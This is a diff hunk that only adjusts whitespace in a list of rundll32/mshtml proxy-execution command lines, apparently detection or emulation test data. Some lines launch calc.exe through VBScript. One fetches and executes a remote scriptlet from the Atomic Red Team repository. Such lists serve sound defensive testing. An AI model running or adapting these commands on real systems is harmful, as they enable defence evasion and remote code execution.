@@ -1,6 +1,6 @@
 "cmd.exe" /c rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
 "cmd.exe" /c rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
 "cmd.exe" /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
-rundll32  vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
-rundll32  vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
-rundll32.exe  javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
+rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
+rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
